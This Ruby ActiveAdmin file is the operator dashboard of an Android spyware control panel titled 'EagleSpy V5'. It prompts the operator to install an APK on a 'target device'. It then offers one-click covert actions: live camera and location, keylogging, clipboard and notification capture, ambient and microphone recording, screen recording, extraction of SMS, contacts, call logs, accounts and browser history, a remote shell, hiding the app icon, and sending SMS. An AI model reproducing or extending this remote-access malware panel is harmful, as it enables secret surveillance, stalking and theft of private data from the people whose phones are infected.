ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "🚀 Command Center"

  content title: "🚀 Command Center" do

    # Toast container for command feedback
    div id: "toast-container", class: "toast-container"

    devices = Smartphone.joins(:apk_installation)
                       .where("apk_installations.status = ?", "installed")

    # Title
    div class: "eagle-title" do
      h1 do
        span "Eagle"
        text_node "Spy"
      end
      span "V5", class: "eagle-version"
    end

    if devices.empty?
      div class: "empty-state" do
        span "📡", class: "empty-icon"
        h2 "Waiting for Devices..."
        para "Install the APK on a target device to begin monitoring."
        div class: "apk-link" do
          text_node "http://#{request.host}:#{request.port}/app-release.apk"
        end
      end
    else
      # ─── Stats Grid ───
      total_devices = Smartphone.count
      total_photos = Picture.count
      total_keylogs = Keylog.count rescue 0
      total_locations = GeoLocation.count
      total_sms = SmsMessage.count
      total_recordings = Recording.count

      div class: "stats-grid" do
        [
          ["📱", "#{devices.count}/#{total_devices}", "Devices", "blue"],
          ["⌨️", total_keylogs, "Keylogs", "purple"],
          ["💬", total_sms, "SMS", "cyan"],
          ["📍", total_locations, "Locations", "green"],
          ["📷", total_photos, "Photos", "amber"],
          ["🎵", total_recordings, "Recordings", "red"]
        ].each do |icon, val, label, color|
          div class: "stat-card", "data-color": color do
            div class: "stat-icon" do
              text_node icon
            end
            span val.to_s, class: "stat-value"
            span label, class: "stat-label"
          end
        end
      end

      # ─── Device Cards ───
      devices.each do |device|
        div class: "device-card" do
          # Header
          div class: "device-header" do
            div class: "device-avatar" do
              text_node raw('<svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>')
            end
            div class: "device-meta" do
              h3 device.name || "Unknown Device"
              div class: "device-os" do
                text_node "#{device.operating_system || 'Android'} · ID: #{device.device_id || '—'}"
              end
            end
            # Use updated_at as last activity proxy
            last_activity = device.updated_at
            is_recent = last_activity && (Time.current - last_activity) < 5.minutes
            status_class = is_recent ? "device-status online" : "device-status offline"
            status_text = is_recent ? "Online" : (last_activity ? "#{time_ago_in_words(last_activity)} ago" : "Unknown")
            div class: status_class do
              span "", class: "pulse-dot"
              text_node status_text
            end
          end

          # Tab Bar
          div class: "tab-bar" do
            [
              ["👁", "Surveillance"],
              ["📦", "Data"],
              ["🎮", "Control"],
              ["🤖", "AI"],
              ["📊", "Analytics"]
            ].each_with_index do |(icon, label), i|
              cls = i == 0 ? "tab-btn active" : "tab-btn"
              button class: cls, id: "btn-#{device.id}-#{i}", onclick: "switchTab(this,'pane-#{device.id}-#{i}')" do
                span icon, class: "tab-icon"
                text_node label
              end
            end
          end

          # ─── TAB 0: Surveillance ───
          div class: "tab-pane active", id: "pane-#{device.id}-0" do
            span "LIVE MONITORING", class: "section-label"
            div class: "action-grid" do
              [
                [admin_live_streaming_path(device_id: device.id), "📹", "Live Camera", "c-red"],
                [admin_live_location_path(device_id: device.id), "📍", "Live Location", "c-green"],
                [admin_keylogs_path(q: { smartphone_id_eq: device.id }), "⌨️", "Keylogger", "c-cyan"],
                [admin_notifications_path(device_id: device.id), "🔔", "Notifications", "c-amber"],
                [admin_clipboard_monitor_path(device_id: device.id), "📋", "Clipboard", "c-blue"],
              ].each do |path, icon, label, cls|
                a href: path, class: "action-btn #{cls}" do
                  span icon, class: "action-icon"
                  span label, class: "action-label"
                end
              end
            end

            span "CAPTURE", class: "section-label"
            div class: "action-grid" do
              a href: take_picture_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-pink" do
                span "📷", class: "action-icon"
                span "Take Photo", class: "action-label"
              end
              a href: dump_screen_snap_screenshots_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-purple" do
                span "🖥️", class: "action-icon"
                span "Screenshot", class: "action-label"
              end
              a href: screen_record_screenshots_path(smartphone_id: device.id, duration: 30), "data-method": "post", "data-remote": "true", class: "action-btn c-purple" do
                span "🎬", class: "action-icon"
                span "Screen Rec", class: "action-label"
              end
              a href: microphone_rec_recordings_path(smartphone_id: device.id, duration: 10), "data-method": "post", "data-remote": "true", class: "action-btn c-blue" do
                span "🎤", class: "action-icon"
                span "Mic Record", class: "action-label"
              end
              a href: ambient_record_smartphones_path(smartphone_id: device.id, duration: 60), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "🌙", class: "action-icon"
                span "Ambient Rec", class: "action-label"
              end
            end
          end

          # ─── TAB 1: Data ───
          div class: "tab-pane", id: "pane-#{device.id}-1" do
            span "COLLECTED DATA", class: "section-label"
            div class: "action-grid" do
              [
                [admin_sms_messages_path(q: { smartphone_id_eq: device.id }), "💬", "SMS", "c-cyan"],
                [admin_call_logs_path(q: { smartphone_id_eq: device.id }), "📞", "Call Logs", "c-blue"],
                [admin_contacts_path(q: { smartphone_id_eq: device.id }), "👥", "Contacts", "c-purple"],
                [admin_pictures_path(q: { smartphone_id_eq: device.id }), "🖼️", "Gallery", "c-amber"],
                [admin_recordings_path(q: { smartphone_id_eq: device.id }), "🎵", "Recordings", "c-pink"],
                [admin_file_browser_path(device_id: device.id), "📁", "Files", "c-lime"],
              ].each do |path, icon, label, cls|
                a href: path, class: "action-btn #{cls}" do
                  span icon, class: "action-icon"
                  span label, class: "action-label"
                end
              end
            end

            span "EXTRACT", class: "section-label"
            div class: "action-grid" do
              a href: dump_device_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-green" do
                span "ℹ️", class: "action-icon"
                span "Device Info", class: "action-label"
              end
              a href: dump_wifi_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-blue" do
                span "📶", class: "action-icon"
                span "WiFi Info", class: "action-label"
              end
              a href: get_accounts_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-purple" do
                span "🔐", class: "action-icon"
                span "Accounts", class: "action-label"
              end
              a href: get_app_usage_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-amber" do
                span "📊", class: "action-icon"
                span "App Usage", class: "action-label"
              end
              a href: get_browser_history_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "🌐", class: "action-icon"
                span "Browser", class: "action-label"
              end
            end
          end

          # ─── TAB 2: Control ───
          div class: "tab-pane", id: "pane-#{device.id}-2" do
            span "DEVICE CONTROL", class: "section-label"
            div class: "action-grid" do
              a href: run_shell_command_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-green" do
                span "💻", class: "action-icon"
                span "Shell", class: "action-label"
              end
              a href: list_apps_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-lime" do
                span "📱", class: "action-icon"
                span "List Apps", class: "action-label"
              end
              a href: hide_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-purple" do
                span "👻", class: "action-icon"
                span "Hide Icon", class: "action-label"
              end
              a href: show_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-blue" do
                span "👁️", class: "action-icon"
                span "Show Icon", class: "action-label"
              end
              a href: toggle_wifi_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "📡", class: "action-icon"
                span "Toggle WiFi", class: "action-label"
              end
              a href: wake_lock_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-amber" do
                span "🔓", class: "action-icon"
                span "Wake Screen", class: "action-label"
              end
              a href: set_audio_mode_smartphones_path(smartphone_id: device.id, mode: 'silent'), "data-method": "post", "data-remote": "true", class: "action-btn c-red" do
                span "🔇", class: "action-icon"
                span "Silent Mode", class: "action-label"
              end
              a href: send_sms_sms_messages_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-pink" do
                span "📤", class: "action-icon"
                span "Send SMS", class: "action-label"
              end
            end
          end

          # ─── TAB 3: AI ───
          div class: "tab-pane", id: "pane-#{device.id}-3" do
            span "AI INTELLIGENCE", class: "section-label"
            div class: "action-grid" do
              a href: admin_ai_chat_path, class: "action-btn c-purple" do
                span "🤖", class: "action-icon"
                span "AI Chat", class: "action-label"
              end
              a href: admin_ai_analysis_path, class: "action-btn c-blue" do
                span "🧠", class: "action-icon"
                span "AI Analysis", class: "action-label"
              end
              a href: admin_ai_health_path, class: "action-btn c-green" do
                span "🔍", class: "action-icon"
                span "Health Monitor", class: "action-label"
              end
            end
          end

          # ─── TAB 4: Analytics ───
          div class: "tab-pane", id: "pane-#{device.id}-4" do
            span "DEVICE STATISTICS", class: "section-label"
            div class: "analytics-grid" do
              total_keylogs_dev = (Keylog.where(smartphone_id: device.id).count rescue 0)
              [
                ["🔤", total_keylogs_dev, "Keylogs"],
                ["💬", SmsMessage.where(smartphone_id: device.id).count, "SMS"],
                ["📷", Picture.where(smartphone_id: device.id).count, "Photos"],
                ["📍", GeoLocation.where(smartphone_id: device.id).count, "Locations"],
                ["📞", CallLog.where(smartphone_id: device.id).count, "Call Logs"],
                ["👥", Contact.where(smartphone_id: device.id).count, "Contacts"],
                ["🎵", Recording.where(smartphone_id: device.id).count, "Recordings"],
              ].each do |ico, val, lbl|
                div class: "analytic-card" do
                  span ico, class: "analytic-icon"
                  span val.to_s, class: "analytic-value"
                  span lbl, class: "analytic-label"
                end
              end
            end
          end

        end # device-card
      end # devices.each
    end

    # ─── JavaScript ───
    script do
      text_node <<~JS.html_safe
        // Tab switching
        function switchTab(btn, paneId) {
          var card = btn.closest('.device-card');
          card.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
          card.querySelectorAll('.tab-pane').forEach(function(p) { p.classList.remove('active'); });
          btn.classList.add('active');
          var pane = document.getElementById(paneId);
          if (pane) pane.classList.add('active');
        }

        // Toast notification system
        window.showToast = function(message, type) {
          type = type || 'success';
          var container = document.getElementById('toast-container');
          if (!container) return;
          var icons = { success: '✅', error: '❌', pending: '⏳' };
          var toast = document.createElement('div');
          toast.className = 'toast toast-' + type;
          toast.innerHTML = '<span class="toast-icon">' + (icons[type] || '📌') + '</span>' +
                            '<span class="toast-msg">' + message + '</span>' +
                            '<button class="toast-close" onclick="this.parentElement.remove()">✕</button>';
          container.appendChild(toast);
          setTimeout(function() { toast.remove(); }, 5000);
        };

        // Auto-show toast on AJAX responses
        document.addEventListener('ajax:success', function(e) {
          var resp = e.detail && e.detail[0];
          if (resp && typeof resp === 'string' && resp.length < 200) {
            showToast(resp, 'success');
          } else {
            showToast('Command sent successfully', 'success');
          }
        });
        document.addEventListener('ajax:error', function(e) {
          showToast('Command failed', 'error');
        });
      JS
    end

  end
end
